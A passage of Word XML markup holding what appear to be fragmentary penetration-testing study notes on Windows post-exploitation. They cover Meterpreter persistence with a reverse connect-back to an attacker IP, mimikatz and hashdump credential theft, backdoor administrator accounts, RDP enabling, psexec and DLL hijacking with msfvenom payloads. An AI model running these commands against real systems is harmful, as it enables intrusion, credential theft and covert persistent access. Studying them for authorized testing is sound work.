    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003C1">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="59"/>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Extract password related info</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003C2">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="59"/>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64 but, meterpreter </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003C3">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="59"/>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on 32;</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003C4">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="59"/>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Ps -A x86_64 -s (architecture, system processes)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003C5">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="59"/>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Migrate to an appropriate </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003C6">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="59"/>
        </w:numPr>
        <w:spacing w:after="0" w:afterAutospacing="0" w:before="0" w:beforeAutospacing="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Load mimikatz </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003C7">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="59"/>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Credential Editor → binary that has to be uploaded to the target</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003C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C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3kw32q32gbr" w:id="144"/>
        <w:bookmarkEnd w:id="14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Enable Rdp Service</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003C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With a session</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003CB">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="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Shell, check whether service is started</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003CC">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="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start service / wmic service where / meterpreter scripts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post/windows/gather/enum_service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w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003CD">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:spacing w:after="0" w:afterAutospacing="0" w:before="0" w:beforeAutospacing="0" w:line="312" w:lineRule="auto"/>
        <w:ind w:left="72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disabled</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003CE">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="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METERPRETER SCRIPT.  </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003CF">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:spacing w:after="0" w:afterAutospacing="0" w:before="0" w:beforeAutospacing="0" w:line="312" w:lineRule="auto"/>
        <w:ind w:left="144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getgui -e (enable)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003D0">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="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3D1">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="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Add user to rdp group</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003D2">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="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localgroup “Remote Desktop Users” new_user /add</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003D3">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="6"/>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3D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D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7xhchf3ga3bu" w:id="145"/>
        <w:bookmarkEnd w:id="145"/>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003D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7xhchf3ga3bu" w:id="145"/>
        <w:bookmarkEnd w:id="145"/>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003D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xhchf3ga3bu" w:id="145"/>
        <w:bookmarkEnd w:id="14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Backdoor</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003D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Connect back (on reboot persistence) → avoids dynamic addresses or firewalls.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However,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will always connect to the same IP </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003D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Against windows;</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003DA">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
        <w:spacing w:after="0" w:afterAutospacing="0" w:before="200" w:line="312" w:lineRule="auto"/>
        <w:ind w:left="72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persistence </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003DB">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 (handler on our machine)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003DC">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-X (start at boot)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003DD">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 5 (reconnect attempt)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003DE">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 8080 (connectback to)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003DF">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 IPaddress (our)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003E0">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persistence -A -x -i 5 -p 9090 -r 10.10.10.0</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003E1">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receive shell,use exploit/multi/handler with same options (payload/ip/port)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003E2">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>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Manual steps</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003E3">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file</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003E4">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="3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Edit registry key values;</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003E5">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="31"/>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Reg steval -k path -d val(payload) -v name</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003E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zby1qbaemw" w:id="146"/>
        <w:bookmarkEnd w:id="14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New User</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003E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Shell</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003E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user newuser newpass /add</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003E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localgroup “Administrators newUser /add</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003E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E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E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E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EE">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4z49mp94xfu2" w:id="147"/>
        <w:bookmarkEnd w:id="14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DLL Hijacking / Preloading / Insecure Library Loading</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003E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Leveraging DLL Search Order</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003F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dir app launched → system 32 → 16bit windows dir \system → \windows →  curr dir at execution → directories in path)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003F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 slack and skype updates execution of a dll, replacing file exe looked from import in update process</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003F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Identify with tools</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003F3">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="39"/>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Process monitor</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003F4">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F5">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:spacing w:before="200" w:line="312" w:lineRule="auto"/>
        <w:ind w:left="72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F6">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am1cmwkkwy" w:id="148"/>
        <w:bookmarkEnd w:id="14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(Maintaining Access)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003F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Meterpreter shell </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003F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Stability , get ids,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migrate to svchost</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003F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Hashdump</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post/windows/gather/smart_hashdump</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003F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background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into msfconsole</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003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Creds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(all discovered creds)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003F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3F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the hashes.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003F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Psexec module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use exploit/windows/smb/psexec</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003F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status_access_denied (not access to administrative shareS)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000040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registry entries in meterpreter</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000040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Then add new user (so password changes don't affect it)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000040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Getgui -e -u USER -p PASS</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000040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0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local windows ( xfreerdp /v:IP /u:USER /p:PASS)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000040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0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exploit/windows/local/persistence </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000040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session and startup user (SYSTEM) and payload (reverse_tcp)</w:t>
          <w:br w:type="textWrapping"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000040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connect </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000040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exploit/multi/handler</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000040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PAYLOAD reverse_tcp</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000040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w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000040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0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udj21yvhpls" w:id="149"/>
        <w:bookmarkEnd w:id="14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(DLL Hijacking)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000040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DLL Search order </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000040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Looking for the vulnerable order</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000410">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3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Process explorer</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000411">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="3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Add user column</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000412">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Process running as SYSTEM</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000413">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 at location of binary </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000414">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 at service it runs as</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000415">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3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PRocess Monitor</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000416">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="3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Actions of services</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000417">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="3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Filter; process name</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000418">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Stop and start service to see actions</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000419">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Can't find a dll ? in that case replace the dll, with payload</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000041A">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="36"/>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Msfvenom dll payload</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000041B">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="36"/>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exploit/multi/handler, set payload</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000041C">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:spacing w:before="200" w:line="312" w:lineRule="auto"/>
        <w:ind w:left="2160" w:firstLine="0"/>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1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t97xeqavxv9" w:id="150"/>
        <w:bookmarkEnd w:id="15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Pillaging</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000041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Local information</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000041F">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3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Creds</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000420">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Files</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000421">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Im logs</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000422">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information</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000423">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Internal network blocks</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000424">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Domains </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000425">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="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Intranet servers</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000426">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3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Shared hard drives</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000042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Useful commands:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000042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sysinfo</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000042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Getuid </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000042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2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pi9rs3joct6" w:id="151"/>
        <w:bookmarkEnd w:id="15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Services</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000042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post/[windows/linux]/gather</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004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post/windows/gather/enum_services </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000042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Wmic service get Caption,Startname,State,pathname</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000042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3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78ss2cgfxnt" w:id="152"/>
        <w:bookmarkEnd w:id="15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Domain</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004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start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service --status-all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service currently started</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000043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view /domain</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post/windows/gather/enum_domains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check if part of domain or domain controller</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000043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group “Domain Controllers” /domain</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000043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3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p67q4mjpfj17" w:id="153"/>
        <w:bookmarkEnd w:id="153"/>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000043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67q4mjpfj17" w:id="153"/>
        <w:bookmarkEnd w:id="15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Information</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004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user  ←→ Cat /etc/passwd</w:t>
        </w:r>
      </w:ins>
    </w:p>
